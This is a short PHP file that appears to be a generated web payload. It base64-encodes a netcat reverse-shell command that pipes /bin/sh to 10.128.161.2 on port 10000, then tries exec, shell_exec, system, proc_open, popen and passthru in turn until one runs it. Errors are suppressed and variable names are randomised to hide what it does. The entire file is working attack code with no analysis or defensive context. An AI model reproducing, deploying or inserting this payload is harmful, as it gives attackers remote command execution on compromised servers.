/*<?php /**/
@error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
$x9v=@ini_get('disable_functions');
if(!empty($x9v)){
  $x9v=preg_replace('/[, ]+/',',',$x9v);
  $x9v=explode(',',$x9v);
  $x9v=array_map('trim',$x9v);
}else{
  $x9v=array();
}

$fJvHLKaU4r=base64_decode('bWtmaWZvIC90bXAvdnVkamtkOyBuYyAxMC4xMjguMTYxLjIgMTAwMDAgMDwvdG1wL3Z1ZGprZCB8IC9iaW4vc2ggPi90bXAvdnVkamtkIDI+JjE7IHJtIC90bXAvdnVkamtk');
if (FALSE!==stristr(PHP_OS,'win')){
  $fJvHLKaU4r=$fJvHLKaU4r." 2>&1\n";
}
$dNmPsmBRem='is_callable';
$nN0bGvUWz='in_array';
if($dNmPsmBRem('exec')&&!$nN0bGvUWz('exec',$x9v)){
  $w7r1fBd=array();
  exec($fJvHLKaU4r,$w7r1fBd);
  $w7r1fBd=join(chr(10),$w7r1fBd).chr(10);
}else
if($dNmPsmBRem('shell_exec')&&!$nN0bGvUWz('shell_exec',$x9v)){
  $w7r1fBd=`$fJvHLKaU4r`;
}else
if($dNmPsmBRem('system')&&!$nN0bGvUWz('system',$x9v)){
  ob_start();
  system($fJvHLKaU4r);
  $w7r1fBd=ob_get_contents();
  ob_end_clean();
}else
if($dNmPsmBRem('proc_open')&&!$nN0bGvUWz('proc_open',$x9v)){
  $handle=proc_open($fJvHLKaU4r,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
  $w7r1fBd=NULL;
  while(!feof($pipes[1])){
    $w7r1fBd.=fread($pipes[1],1024);
  }
  @proc_close($handle);
}else
if($dNmPsmBRem('popen')&&!$nN0bGvUWz('popen',$x9v)){
  $fp=popen($fJvHLKaU4r,'r');
  $w7r1fBd=NULL;
  if(is_resource($fp)){
    while(!feof($fp)){
      $w7r1fBd.=fread($fp,1024);
    }
  }
  @pclose($fp);
}else
if($dNmPsmBRem('passthru')&&!$nN0bGvUWz('passthru',$x9v)){
  ob_start();
  passthru($fJvHLKaU4r);
  $w7r1fBd=ob_get_contents();
  ob_end_clean();
}else
{
  $w7r1fBd=0;
}

?>
